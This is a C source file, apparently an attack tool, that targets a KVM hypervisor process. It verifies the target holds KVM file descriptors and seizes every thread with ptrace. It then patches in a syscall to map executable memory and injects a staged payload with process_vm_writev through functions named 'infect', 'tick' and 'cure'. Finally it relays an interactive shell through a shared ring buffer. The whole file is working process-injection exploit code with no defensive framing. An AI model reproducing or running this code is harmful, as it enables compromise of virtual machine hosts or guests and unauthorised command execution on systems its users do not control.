#define _GNU_SOURCE

#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <assert.h>
#include <dirent.h>
#include <elf.h>
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <time.h>
#include <unistd.h>

#include <sys/mman.h>
#include <sys/ptrace.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <sys/un.h>
#include <sys/user.h>
#include <sys/wait.h>

#include "stage1/stage1.h"

extern void *_binary_stage1_bin_start;
extern void *_binary_stage1_bin_size;

static int is_kvm(pid_t pid) {
	bool has_kvm, has_kvm_vm, has_kvm_vcpu = false;
	char fds_path[256];

	snprintf(fds_path, sizeof(fds_path), "/proc/%d/fd", pid);
	DIR *fds = opendir(fds_path);

	if (fds == NULL)
		return false;

	struct dirent *dent;
	while ((dent = readdir(fds)) != NULL) {
		char fd_path[277];
		char ln_path[256];
		ssize_t err2;

		snprintf(fd_path, sizeof(fd_path), "/proc/%d/fd/%s", pid, dent->d_name);
		err2 = readlink(fd_path, ln_path, sizeof(ln_path));
		if (err2 > 0) {
			if (strstr(ln_path, "anon_inode:kvm-vcpu:") == ln_path) {
				has_kvm_vcpu = true;
			} else if (strstr(ln_path, "anon_inode:kvm-vm") == ln_path) {
				has_kvm_vm = true;
			} else if (strstr(ln_path, "/dev/kvm") == ln_path) {
				has_kvm = true;
			}
		}
	}

	closedir(fds);

	if (!(has_kvm && has_kvm_vm && has_kvm_vcpu)) {
		if (errno == 0)
			errno = ENOENT;

		return false;
	}

	return true;
}

#define FOR_EACH_THREAD(pid, BLOCK) do { \
	char tasks_path[256]; \
\
	snprintf(tasks_path, sizeof(tasks_path), "/proc/%d/task", pid); \
	DIR *tasks = opendir(tasks_path); \
\
	if (tasks == NULL) \
		break; \
\
	struct dirent *dent; \
	while ((dent = readdir(tasks)) != NULL) { \
		if (dent->d_name[0] == '.') \
			continue; \
\
		pid_t tid = atoi(dent->d_name); \
\
		{ BLOCK } \
	} \
\
	closedir(tasks); \
\
} while (0)

static int infect(pid_t kvm_pid, struct shell_state *state, void *stage1_start, size_t stage1_len, void *stage2_start, size_t stage2_len) {
	FOR_EACH_THREAD(kvm_pid, {
		ptrace(PTRACE_SEIZE, tid, NULL, NULL);
		ptrace(PTRACE_INTERRUPT, tid, NULL, NULL);
		while (true) {
			int r = waitpid(tid, NULL, 0);
			if (r >= 0)
				break;

			if ((r < 0) && (errno == ECHILD))
				break;
		}
	});

	struct user_regs_struct gp_regs;

	ptrace(PTRACE_GETREGS, kvm_pid, NULL, &gp_regs);
	long tmp_word = ptrace(PTRACE_PEEKTEXT, kvm_pid, gp_regs.rip, NULL);
	ptrace(PTRACE_POKETEXT, kvm_pid, gp_regs.rip, 0x050f);

	struct user_regs_struct syscall_regs = gp_regs;

	size_t pml4_offset = stage1_len + sizeof(struct shell_state) + stage2_len;
	pml4_offset = (((pml4_offset - 1) >> 12) + 1) << 12;

	size_t mmap_len = pml4_offset + (2 << 12) + SHELL_CHILD_STACK_SIZE + SHELL_VCPU_STACK_SIZE;

	syscall_regs.rax = SYS_mmap;
	syscall_regs.rdi = 0;
	syscall_regs.rsi = mmap_len;
	syscall_regs.rdx = PROT_READ | PROT_WRITE | PROT_EXEC;
	syscall_regs.r10 = MAP_ANONYMOUS | MAP_PRIVATE;
	syscall_regs.r8 = 0;
	syscall_regs.r9 = 0;

	ptrace(PTRACE_SETREGS, kvm_pid, NULL, &syscall_regs);
	ptrace(PTRACE_SINGLESTEP, kvm_pid, NULL, NULL);
	while (waitpid(kvm_pid, NULL, 0) < 0);
	ptrace(PTRACE_GETREGS, kvm_pid, NULL, &syscall_regs);

	state->shell_hook = (void *) syscall_regs.rax;
	state->shell_len = mmap_len;

	state->shell_self = ((void *) state->shell_hook) + stage1_len;

	state->shell_stage2_start = ((void *) state->shell_self) + sizeof(struct shell_state);
	state->shell_stage2_len = stage2_len;

	state->shell_vcpu_pml4 = ((void *) state->shell_hook) + pml4_offset;
	state->shell_vcpu_pdpt = ((void *) state->shell_vcpu_pml4) + (1 << 12);

	state->shell_child_stack = ((void *) state->shell_vcpu_pdpt) + (1 << 12);
	state->shell_vcpu_stack = ((void *) state->shell_child_stack) + SHELL_CHILD_STACK_SIZE;

	state->shell_locked = false;

	struct iovec stage1_iov[3] = {
		{ .iov_base = stage1_start, .iov_len = stage1_len },
		{ .iov_base = state, .iov_len = sizeof(struct shell_state) },
		{ .iov_base = stage2_start, .iov_len = stage2_len }
	};

	struct iovec remote_iov[3] = {
		{ .iov_base = state->shell_hook, .iov_len = stage1_len },
		{ .iov_base = state->shell_self, .iov_len = sizeof(struct shell_state) },
		{ .iov_base = state->shell_stage2_start, .iov_len = stage2_len }
	};

	process_vm_writev(kvm_pid, stage1_iov, 3, remote_iov, 3, 0);

	ptrace(PTRACE_POKETEXT, kvm_pid, gp_regs.rip, tmp_word);
	ptrace(PTRACE_SETREGS, kvm_pid, NULL, &gp_regs);

	FOR_EACH_THREAD(kvm_pid, {
		ptrace(PTRACE_DETACH, tid, NULL, NULL);
	});

	return 0;
}

static int tick(pid_t kvm_pid, struct shell_state *state) {
	FOR_EACH_THREAD(kvm_pid, {
		ptrace(PTRACE_SEIZE, tid, NULL, NULL);
		ptrace(PTRACE_INTERRUPT, tid, NULL, NULL);
		while (true) {
			int r = waitpid(tid, NULL, 0);
			if (r >= 0)
				break;

			if ((r < 0) && (errno == ECHILD))
				break;
		}
	});

	struct iovec local_iov[1] = {
		{ .iov_base = state, .iov_len = sizeof(struct shell_state) }
	};

	struct iovec remote_iov[1] = {
		{ .iov_base = state->shell_self, .iov_len = sizeof(struct shell_state) }
	};

	state->shell_cmd = SHELL_CMD_WAIT;
	process_vm_writev(kvm_pid, local_iov, 1, remote_iov, 1, 0);

	struct user_regs_struct gp_regs;
	ptrace(PTRACE_GETREGS, kvm_pid, NULL, &gp_regs);

	struct user_regs_struct hook_regs = {
		.rip = (uint64_t) state->shell_hook + 16
	};

	ptrace(PTRACE_SETREGS, kvm_pid, NULL, &hook_regs);
	ptrace(PTRACE_CONT, kvm_pid, NULL, NULL);

	do {
		process_vm_readv(kvm_pid, local_iov, 1, remote_iov, 1, 0);
	} while (state->shell_cmd == SHELL_CMD_WAIT);

	ptrace(PTRACE_INTERRUPT, kvm_pid, NULL, NULL);
	while (waitpid(kvm_pid, NULL, 0) < 0);
	ptrace(PTRACE_SETREGS, kvm_pid, NULL, &gp_regs);

	FOR_EACH_THREAD(kvm_pid, {
		ptrace(PTRACE_DETACH, tid, NULL, NULL);
	});

	return 0;
}

static int cure(pid_t kvm_pid, struct shell_state *state) {
	FOR_EACH_THREAD(kvm_pid, {
		ptrace(PTRACE_SEIZE, tid, NULL, NULL);
		ptrace(PTRACE_INTERRUPT, tid, NULL, NULL);
		while (true) {
			int r = waitpid(tid, NULL, 0);
			if (r >= 0)
				break;

			if ((r < 0) && (errno == ECHILD))
				break;
		}
	});

	struct user_regs_struct gp_regs;

	ptrace(PTRACE_GETREGS, kvm_pid, NULL, &gp_regs);
	long tmp_word = ptrace(PTRACE_PEEKTEXT, kvm_pid, gp_regs.rip, NULL);
	ptrace(PTRACE_POKETEXT, kvm_pid, gp_regs.rip, 0x050f);

	struct user_regs_struct syscall_regs = gp_regs;
	syscall_regs.rax = SYS_munmap;
	syscall_regs.rdi = (uint64_t) state->shell_hook;
	syscall_regs.rsi = state->shell_len;

	ptrace(PTRACE_SETREGS, kvm_pid, NULL, &syscall_regs);
	ptrace(PTRACE_SINGLESTEP, kvm_pid, NULL, NULL);
	while (waitpid(kvm_pid, NULL, 0) < 0);

	ptrace(PTRACE_POKETEXT, kvm_pid, gp_regs.rip, tmp_word);
	ptrace(PTRACE_SETREGS, kvm_pid, NULL, &gp_regs);

	FOR_EACH_THREAD(kvm_pid, {
		ptrace(PTRACE_DETACH, tid, NULL, NULL);
	});

	return 0;
}

int main(int argc, char **argv) {
	if (argc != 3)
		return -1;

	char *endptr;
	pid_t kvm_pid = (pid_t) strtol(argv[1], &endptr, 10);
	if (*endptr != '\0')
		return -1;

	int stage2_fd = open(argv[2], O_RDONLY | O_CLOEXEC);
	if (stage2_fd < 0) {
		perror("open");
		return -1;
	}

	off_t stage2_len = lseek(stage2_fd, 0, SEEK_END);
	lseek(stage2_fd, 0, SEEK_SET);

	void *stage2_start = malloc(stage2_len);
	ssize_t read_r = read(stage2_fd, stage2_start, stage2_len);
	if (read_r != stage2_len) {
		perror("read");
		return -1;
	}

	close(stage2_fd);

	if (!is_kvm(kvm_pid)) {
		perror("is_kvm");
		return -1;
	}

	struct shell_state *state = malloc(sizeof(struct shell_state));

	int r = infect(
		kvm_pid, state,
		&_binary_stage1_bin_start, (size_t) &_binary_stage1_bin_size,
		stage2_start, stage2_len);
	if (r < 0) {
		perror("infect");
		return -1;
	}

	time_t start = time(NULL);
	do {
		if (tick(kvm_pid, state) < 0) {
			perror("tick");
			return -1;
		}

		if (state->shell_cmd == SHELL_CMD_AGAIN)
			usleep(1000);
		else
			usleep(10000);

		time_t now = time(NULL);
		if ((now - start) > 1) {
			printf("The clock is ticking...\n");

			start = now;
		}
	} while (state->shell_cmd != SHELL_CMD_MMAP);

	void *shell_ring = (void *) state->shell_ret;

	r = cure(kvm_pid, state);
	if (r < 0) {
		perror("cure");
		return -1;
	}

	free(state);

	uint64_t shell_in_len;
	char shell_in_buf[((1 << 12) - 32) / 2];

	uint64_t shell_out_len;
	char shell_out_buf[((1 << 12) - 32) / 2];

	struct iovec shell_ring_in_local[3] = {
		{ .iov_base = &shell_in_len, .iov_len = sizeof(shell_in_len) },
		{ .iov_base = &shell_in_buf, .iov_len = sizeof(shell_in_buf) },
		{ .iov_base = &shell_out_len, .iov_len = sizeof(shell_out_len) }
	};

	struct iovec shell_ring_in_remote[3] = {
		{ .iov_base = shell_ring + 16, .iov_len = sizeof(shell_in_len) },
		{ .iov_base = shell_ring + 16 + sizeof(shell_in_len), .iov_len = sizeof(shell_in_buf) },
		{ .iov_base = shell_ring + 16 + sizeof(shell_in_len) + sizeof(shell_in_buf), .iov_len = sizeof(shell_out_len) }
	};

	struct iovec shell_ring_flush_local[1] = {
		{ .iov_base = &shell_in_len, .iov_len = sizeof(shell_in_len) }
	};

	struct iovec shell_ring_flush_remote[1] = {
		{ .iov_base = shell_ring + 16, .iov_len = sizeof(shell_in_len) }
	};

	struct iovec shell_ring_out_local[2] = {
		{ .iov_base = &shell_out_len, .iov_len = sizeof(shell_out_len) },
		{ .iov_base = &shell_out_buf, .iov_len = sizeof(shell_out_buf) }
	};

	struct iovec shell_ring_out_remote[2] = {
		{ .iov_base = shell_ring + 16 + sizeof(shell_in_len) + sizeof(shell_in_buf), .iov_len = sizeof(shell_out_len) },
		{
			.iov_base = shell_ring + 16 + sizeof(shell_in_len) + sizeof(shell_in_buf) + sizeof(shell_out_len),
			.iov_len = sizeof(shell_out_buf)
		}
	};

	while (true) {
		if (process_vm_readv(kvm_pid, shell_ring_in_local, 3, shell_ring_in_remote, 3, 0) < 0) {
			perror("process_vm_readv");
			return -1;
		}

		if (shell_in_len > 0) {
			if (write(STDOUT_FILENO, shell_in_buf, shell_in_len) < 0) {
				perror("write");
				return -1;
			}

			if (write(STDOUT_FILENO, NULL, 0) < 0) {
				perror("write");
				return -1;
			}

			shell_in_len = 0;
			if (process_vm_writev(kvm_pid, shell_ring_flush_local, 1, shell_ring_flush_remote, 1, 0) < 0) {
				perror("process_vm_readv");
				return -1;
			}
		}

		if (shell_out_len == 0) {
			struct pollfd poll_stdin = { .fd = STDIN_FILENO, .events = POLLIN };
			poll(&poll_stdin, 1, 1);
			if (poll_stdin.revents & POLLIN) {
				int r = read(STDIN_FILENO, shell_out_buf, sizeof(shell_out_buf));
				if (r < 0) {
					perror("read");
					return -1;
				}

				if (r > 0) {
					shell_out_len = r;
					process_vm_writev(kvm_pid, shell_ring_out_local, 2, shell_ring_out_remote, 2, 0);
				}
			}
		}

		if ((shell_in_len == 0) || (shell_out_len > 0))
			usleep(1000);
		else
			usleep(10000);
	}

	return 0;
}
